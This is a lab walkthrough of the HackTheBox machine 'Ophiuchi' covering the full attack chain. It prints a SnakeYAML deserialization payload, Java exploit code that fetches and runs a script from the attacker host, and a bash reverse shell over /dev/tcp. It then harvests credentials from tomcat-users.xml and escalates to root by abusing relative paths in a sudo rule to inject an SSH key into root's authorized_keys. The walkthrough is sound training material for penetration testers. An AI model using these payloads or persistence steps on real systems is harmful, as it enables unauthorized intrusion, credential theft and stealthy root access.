# HTB Ophiuchi — Full Walkthrough

**Machine:** Ophiuchi  
**Difficulty:** Medium  
**OS:** Linux (Ubuntu 20.04)  
**Target IP:** 10.129.11.226  
**Attacker IP:** 10.10.16.84  

---

## The Big Picture

Before touching a single tool, understand the goal: you are simulating an attacker who has network access to this machine and nothing else. No credentials, no inside knowledge. Every step must be justified by what the evidence tells you.

The attack chain on this box:

1. Discover open ports
2. Find a vulnerable YAML parser running on Tomcat
3. Exploit Java deserialization to get a shell
4. Find credentials left in a config file
5. SSH in as a real user and grab the user flag
6. Abuse a sudo misconfiguration involving WebAssembly to become root

---

## Phase 1 — Reconnaissance

### Step 1: Port Scan with Nmap

```bash
nmap -sC -sV -p 22,8080 10.129.11.226
```

**What this does:**
- `-sC` runs default scripts (banner grabbing, version detection helpers)
- `-sV` probes open ports to determine the service and version
- `-p 22,8080` limits the scan to the two most common ports for this type of box (SSH and HTTP-alt)

**Results:**
```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
8080/tcp open  http    Apache Tomcat 9.0.38
                       Title: Parse YAML
```

**Why we do this:**  
You cannot attack what you cannot see. Port scanning is always the first step — it gives you the map of the attack surface. Two ports means two potential entry points.

**Hacker mindset:**  
See port 8080 with "Apache Tomcat" and think: *Java web application*. Tomcat runs Java servlets and JSPs. Java apps are historically prone to deserialization vulnerabilities. The title "Parse YAML" is an immediate red flag — parsing user-supplied data is exactly where deserialization bugs live.

---

## Phase 2 — Web Enumeration

### Step 2: Inspect the Web Application

Visit `http://10.129.11.226:8080` in a browser or with curl to understand what the app does.

```bash
curl -s http://10.129.11.226:8080/ | grep -i 'form\|action\|method'
```

**What you find:**  
A single-page YAML parser with a textarea form. The form POSTs to `/Servlet`. Submitting any text returns:

> "Due to security reason this feature has been temporarily on hold."

**Hacker mindset:**  
That message says the *feature* is on hold, not that the code is disabled. The error is shown *after* the input is processed — which means the deserialization may still happen before the security check fires. The app is lying about being shut down.

**Why enumerate the form action:**  
Never assume the POST endpoint. Always read the HTML source to find the exact URL (`/Servlet` in this case). Sending a payload to the wrong endpoint wastes time and gives false negatives.

---

## Phase 3 — Exploitation (SnakeYAML Deserialization)

### Step 3: Confirm Deserialization Vulnerability

Start a Python HTTP server on port 80:

```bash
sudo python3 -m http.server 80
```

Send a test YAML payload that instructs the server to load a class from your machine:

```bash
curl -s -X POST http://10.129.11.226:8080/Servlet \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'data=!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.16.84/"]
  ]]
]'
```

**Watch your HTTP server.** If you see:

```
GET /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1
```

...the vulnerability is confirmed.

**What is happening here:**  
SnakeYAML is a Java library that converts YAML text into Java objects. The `!!` syntax tells SnakeYAML to instantiate a specific Java class. By specifying `URLClassLoader` and pointing it at our machine, we force the server to reach out and try to load a Java class from us. This is unauthenticated Remote Code Execution by design flaw.

**Hacker mindset:**  
Always prove a vulnerability before trying to exploit it. The canary (HTTP callback) costs nothing and proves the code path is live. If no callback arrives, the feature really is disabled and you move on rather than wasting hours building an exploit that can't fire.

**Why `ScriptEngineManager`?**  
This is the standard SnakeYAML gadget chain. `ScriptEngineManager` accepts a `URLClassLoader` argument in its constructor, and Java's service loader mechanism then automatically tries to fetch and instantiate any class listed in the `META-INF/services/javax.script.ScriptEngineFactory` file inside the JAR.

---

### Step 4: Build the Exploit JAR

Clone the ready-made payload template:

```bash
git clone https://github.com/artsploit/yaml-payload
cd yaml-payload
```

**Why a JAR and not a raw class file?**  
Java's `URLClassLoader` + service loader combination requires the class to be packaged inside a JAR with the correct `META-INF/services/` directory structure. A raw `.class` file won't trigger automatic instantiation.

Edit `src/artsploit/AwesomeScriptEngineFactory.java`. The constructor runs when the class is instantiated — which happens automatically when the JAR is loaded. Put your payload there:

```java
public AwesomeScriptEngineFactory() throws InterruptedException {
    try {
        Process p = Runtime.getRuntime().exec("curl http://10.10.16.84/shell.sh -o /dev/shm/.s.sh");
        p.waitFor();
        p = Runtime.getRuntime().exec("chmod +x /dev/shm/.s.sh");
        p.waitFor();
        p = Runtime.getRuntime().exec("/dev/shm/.s.sh");
    } catch (IOException e) {
        e.printStackTrace();
    }
}
```

**Why a two-stage approach (download then execute)?**  
`Runtime.getRuntime().exec()` does not use a shell — it cannot handle pipes (`|`), redirects (`>`), or compound commands (`;`). A direct bash reverse shell string like `bash -i >& /dev/tcp/...` will silently fail because `exec()` passes it to the OS as a single binary name with arguments, not to a shell interpreter.

The workaround: use `exec()` to call `curl` (which has no special characters), download a shell script to a writable location (`/dev/shm` is almost always writable), then call `bash` on the script.

**Why `/dev/shm`?**  
It is a tmpfs in RAM. It is world-writable by default on Linux, leaves no disk traces, and is always available regardless of what other directories are mounted or restricted.

Create the reverse shell script:

```bash
cat > /tmp/shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.84/4444 0>&1
EOF
```

Compile and package:

```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf rev.jar -C src/ .
```

---

### Step 5: Deliver the Payload and Catch the Shell

**Terminal 1** — Serve both files from the yaml-payload directory:

```bash
cp /tmp/shell.sh .
sudo python3 -m http.server 80
```

**Terminal 2** — Listen for the reverse shell connection:

```bash
nc -lnvp 4444
```

**Terminal 3** — Trigger the exploit:

```bash
curl -s -X POST http://10.129.11.226:8080/Servlet \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'data=!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.16.84/rev.jar"]
  ]]
]'
```

**You now have a shell as `tomcat`:**

```
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

**Upgrade the shell to a proper TTY:**

```bash
python3 -c 'import pty;pty.spawn("bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter, then type:
reset
# Terminal type: xterm
```

**Why upgrade the shell?**  
A raw netcat shell has no job control, no arrow keys, and Ctrl+C kills your listener rather than the remote process. A proper PTY behaves like a real terminal — essential for interactive tools like `sudo`, `ssh`, and `su`.

---

## Phase 4 — Lateral Movement (tomcat → admin)

### Step 6: Search for Credentials

```bash
cat /opt/tomcat/conf/tomcat-users.xml
```

**What you find:**

```xml
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

**Why look here?**  
Tomcat stores its management credentials in `tomcat-users.xml`. This is well-known to anyone who has managed Tomcat servers. As a pentester, whenever you land on a Tomcat service account, this is the first file you check.

**Hacker mindset:**  
Developers configure services with credentials and then forget about them. Configuration files are a treasure trove — they contain passwords for databases, admin panels, and often other systems. The credential `whythereisalimit` is also likely reused by the human admin account on the OS itself (password reuse is endemic).

---

### Step 7: SSH as Admin and Grab User Flag

From Kali:

```bash
ssh admin@10.129.11.226
# Password: whythereisalimit
```

```bash
cat ~/user.txt
# 2a74f81[redacted]319a436ab
```

**Why SSH instead of `su admin` in the tomcat shell?**  
SSH gives you a clean, stable, fully interactive session. The reverse shell can die if the web request times out. SSH is persistent and reliable for the rest of the engagement.

---

## Phase 5 — Privilege Escalation (admin → root)

### Step 8: Enumerate Sudo Rights

```bash
sudo -l
```

**Output:**

```
(ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

**What this means:**  
The `admin` user can run one specific Go program as root, without a password. This is a common sysadmin pattern — "give this user just enough to do their job." But the implementation is flawed.

**Hacker mindset:**  
`sudo -l` is always your first stop after getting a user shell. Any entry here is a potential escalation path. The interesting detail is that Go is being used to run a *specific file*, but that file's behavior depends on other files in the current directory.

---

### Step 9: Analyze index.go

```bash
cat /opt/wasm-functions/index.go
```

**Key logic:**

```go
bytes, _ := wasm.ReadBytes("main.wasm")       // relative path!
instance, _ := wasm.NewInstance(bytes)
init := instance.Exports["info"]
result, _ := init()
f := result.String()
if (f != "1") {
    fmt.Println("Not ready to deploy")
} else {
    fmt.Println("Ready to deploy")
    out, err := exec.Command("/bin/sh", "deploy.sh").Output()  // relative path!
```

**The vulnerability:**  
`main.wasm` and `deploy.sh` are referenced with **relative paths** — no `/opt/wasm-functions/` prefix. Go (and most runtimes) resolve relative paths from the **current working directory** when the process starts.

Since `sudo` does not change the working directory by default, if you `cd` into a directory you control and run `sudo /usr/bin/go run /opt/wasm-functions/index.go`, the program will read `main.wasm` and `deploy.sh` from *your* directory, not from `/opt/wasm-functions/`.

**Hacker mindset:**  
Relative paths in privileged programs are a classic privesc primitive. The developer assumed the program would always run from `/opt/wasm-functions/`, but `sudo` doesn't enforce that. Always ask: "what does this program depend on, and can I influence those dependencies?"

---

### Step 10: Copy Files to a Writable Directory

```bash
cp -r /opt/wasm-functions/* /dev/shm/
```

We now have our own copies of all files, including `main.wasm` and `deploy.sh`, in a directory we fully control.

---

### Step 11: Understand and Patch main.wasm

**Transfer to Kali:**

```bash
# On Kali:
sshpass -p 'whythereisalimit' scp admin@10.129.11.226:/dev/shm/main.wasm /tmp/main.wasm
```

**Decompile to human-readable WebAssembly Text format:**

```bash
wasm2wat /tmp/main.wasm -o /tmp/main.wat
cat /tmp/main.wat
```

**What you see:**

```wat
(func $info (type 0) (result i32)
  i32.const 0)
```

The `info` function unconditionally returns `0`. The Go program checks `if (f != "1")` — so `0` always prints "Not ready to deploy" and never runs `deploy.sh`.

**Patch it:**

```bash
sed -i 's/i32.const 0/i32.const 1/' /tmp/main.wat
```

**Recompile to binary:**

```bash
wat2wasm /tmp/main.wat -o /tmp/main.wasm
```

**Upload back:**

```bash
sshpass -p 'whythereisalimit' scp /tmp/main.wasm admin@10.129.11.226:/dev/shm/main.wasm
```

**Why WebAssembly?**  
WASM is a binary format designed for portability and sandboxed execution. The `wabt` toolkit (`wasm2wat` / `wat2wasm`) lets you round-trip between binary and text format just like a disassembler/assembler. Understanding what the WASM does only requires reading a few lines of the text format.

**Hacker mindset:**  
When a program checks the output of another binary, ask: "can I replace or modify that binary?" Here we can — because we copied it to our own directory. The gate (`f != "1"`) is just a number check, and we control the code that produces that number.

---

### Step 12: Write the Malicious deploy.sh

Generate an SSH keypair on Kali:

```bash
ssh-keygen -t ed25519 -f /tmp/root_key -N ""
cat /tmp/root_key.pub
```

On the target (in the admin SSH session):

```bash
cat > /dev/shm/deploy.sh << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqWcoss3zADPnxmGRDSfVsi8kWVjIiCNVWPDAYQGhP9 kali@kali" >> /root/.ssh/authorized_keys
EOF
chmod +x /dev/shm/deploy.sh
```

**Why SSH key injection instead of a reverse shell?**  
A reverse shell is fragile — one network hiccup and it dies. Writing your public key to root's `authorized_keys` is **persistent**. Even if you lose the connection, you can SSH back in as root at any time. It is also completely silent — no new processes, no outbound connections triggered by the escalation itself.

**Why `mkdir -p /root/.ssh`?**  
If `/root/.ssh` does not exist, the `echo >>` would fail silently. The `-p` flag creates the directory (and any parents) only if needed, and does not error if it already exists.

---

### Step 13: Trigger the Exploit

```bash
cd /dev/shm
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

**Expected output:**

```
Ready to deploy
```

What just happened, step by step:
1. `sudo` ran `index.go` as root, with CWD = `/dev/shm`
2. `index.go` read `main.wasm` from `/dev/shm` (our patched version)
3. The `info` function returned `1` instead of `0`
4. The if-check passed
5. `/bin/sh deploy.sh` ran — from `/dev/shm` — as **root**
6. Our deploy.sh appended our public key to `/root/.ssh/authorized_keys`

---

### Step 14: SSH in as Root and Grab the Flag

```bash
ssh -i /tmp/root_key root@10.129.11.226
cat /root/root.txt
# 2029f2d[redacted]52012043ca
```

**Machine fully compromised.**

---

## Flags

| Flag | Value |
|---|---|
| user.txt | `2a74f81[redacted]19a436ab` |
| root.txt | `2029f2d[redacted]012043ca` |

---

## Key Lessons

| Lesson | Why It Matters |
|---|---|
| Parsing user input is dangerous | YAML/XML/JSON parsers that instantiate classes are deserialization sinks |
| Java `exec()` doesn't use a shell | Pipes and redirects silently fail — always use a script as intermediary |
| Credentials live in config files | `tomcat-users.xml`, `.env`, `config.php` — always grep for them |
| Relative paths in sudo programs = privesc | The program runs where *you* are, not where it was installed |
| SSH key injection beats reverse shells | Persistent, reliable, and stealthy compared to a callback shell |
| `/dev/shm` is your best friend | Always writable, in RAM, leaves no disk trace |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port scanning and service fingerprinting |
| `curl` | HTTP interaction and payload delivery |
| `java` / `javac` / `jar` | Compile and package the exploit JAR |
| `python3 -m http.server` | Serve files to the target |
| `nc` | Catch the reverse shell |
| `wasm2wat` / `wat2wasm` | Decompile and recompile WebAssembly |
| `ssh-keygen` | Generate the SSH keypair for root access |
| `scp` / `sshpass` | Transfer files to/from the target over SSH |
